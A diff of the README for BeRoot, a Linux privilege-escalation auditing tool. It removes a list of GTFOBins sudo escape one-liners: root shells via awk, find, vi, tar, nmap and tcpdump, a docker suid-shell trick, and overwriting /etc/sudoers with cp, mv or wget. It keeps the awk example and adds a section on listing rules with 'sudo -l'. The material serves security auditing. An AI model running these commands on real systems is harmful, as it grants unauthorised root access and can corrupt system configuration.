@@ -8,107 +8,13 @@ This Readme explains all technics implemented by BeRoot to better understand how
 GTFOBins
 ----
 
-[GTFOBins](https://gtfobins.github.io/#) could be used to gain root privilege on a system. These binaries allow a user to execute arbitrary code on the host, so imagine you could have access to one of them with sudo privilege (suid binary or if it's allowed on the sudoers file), you should be able to execute system command as root. Take a look of the [GTFOBins](https://gtfobins.github.io/#) project to have a list more complete.  
+[GTFOBins](https://gtfobins.github.io/#) could be used to gain root privilege on a system. These binaries allow a user to execute arbitrary code on the host, so imagine you could have access to one of them with sudo privilege (suid binary or if it's allowed on the sudoers file), you should be able to execute system command as root. BeRoot contains a list of theses binaries taken from [GTFOBins](https://gtfobins.github.io/#).  
 
-Here is a list of some well-known binaries: 
+Here is an example of a well-known binary: 
 
 * awk
 ```
 sudo awk 'BEGIN {system("/bin/sh")}'
-```
-
-* docker (if you can call docker, no need to run it with sudo)
-```
-docker run -v /home/${USER}:/h_docs ubuntu bash -c "cp /bin/bash /h_docs/rootshell && chmod 4777 /h_docs/rootshell;" && ~/rootshell -p
-```
-
-* find
-```
-sudo find . -type d -exec sh -c id {} \;
-```
-
-* file viewer
-```
-less:	!bash
-man: 	!bash or $ sudo man -P whoami man
-more: 	!bash
-```
-
-* file modifications (cannot be consider as GTFOBins but useful for privilege escalation)
-```
-cp:	sudo cp -f your_file /etc/sudoers
-mv:	sudo mv -f your_file /etc/sudoers
-```
-
-* ftp / sftp
-```
-ftp> ! ls
-```
-
-* git
-```
-export PAGER=./runme.sh
-sudo git -p help
-```
-
-* mount
-```
-sudo mount -o bind /bin/bash /bin/mount
-sudo mount
-```
-
-* nmap
-```
-echo "os.execute('/bin/sh')" > /tmp/script.nse
-sudo nmap --script=/tmp/script.nse
-```
-
-* rsync
-```
-echo "whoami > /tmp/whoami" > /tmp/tmpfile
-sudo rsync  -e 'sh /tmp/tmpfile' /dev/null 127.0.0.1:/dev/null 2>/dev/null
-
-cat whoami 
-root
-```
-
-* scripting languages
-```
-lua: 	os.execute('/bin/sh')
-perl: 	sudo  perl -e 'exec "/bin/sh";'
-python: sudo  python -c 'import os;os.system("/bin/sh")'
-ruby: 	sudo ruby -e 'exec "/bin/sh"'
-```
-
-* tar
-```
-sudo tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh
-```
-
-* text editor
-```
-vi: 	sudo vi -c '!sh' or :!bash or :set shell=/bin/bash:shell or :shell
-vim : 	sudo vim -c '!sh' or :!bash or :set shell=/bin/bash:shell or :shell
-```
-
-* tcpdump
-```
-echo "whoami > /tmp/whoami" > /tmp/tmpfile
-sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z ./tmpfile -Z root
-
-cat whoami 
-root
-```
-
-* wget (overwrite system file - need a web server)
-```
-sudo wget http://127.0.0.1/sudoers -O /etc/sudoers
-```
-
-* zip
-```
-echo "/bin/sh" > /tmp/run.sh
-sudo zip z.zip * -T -TT /tmp/run.sh
 ```
 
 __Note__: If you have more binary example, do not hesitate to open an issue explaining the technic and I will add it on the list. 
@@ -288,6 +194,29 @@ So BeRoot will analyse all rules:
 	* check if we can impersonate another user ("su" command)
 		* check write permissions on sensitive files and suid bin for this user
 		* realize again all these checks on the sudoers file using this new user
+
+Sudo list
+----
+
+Sometimes you do not have access to /etc/sudoers. 
+```
+$ cat /etc/sudoers
+cat: /etc/sudoers: Permission denied
+```
+However, listing sudo rules is possible using sudo -l
+```
+$ sudo -l  
+Matching Defaults entries for test on XXXXX:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User test may run the following commands on XXXXX:
+    (ALL) /bin/bash
+```
+Why is it possible ? On the [documentation](https://www.sudo.ws/man/1.8.17/sudoers.man.html) it's written: 
+```By default, if the NOPASSWD tag is applied to any of the entries for a user on the current host, he or she will be able to run "sudo -l" without a password. [...] This behavior may be overridden via the verifypw and listpw options```
+
+However, these rules only affect the current user, so if user impersonation is possible (using su) `sudo -l` should be launched from this user as well. \
+BeRoot collects all these rules from all possible user an realize exaclty the same tests as listed perviously (e.g sudoers file method).
 
 Exploit
 ----
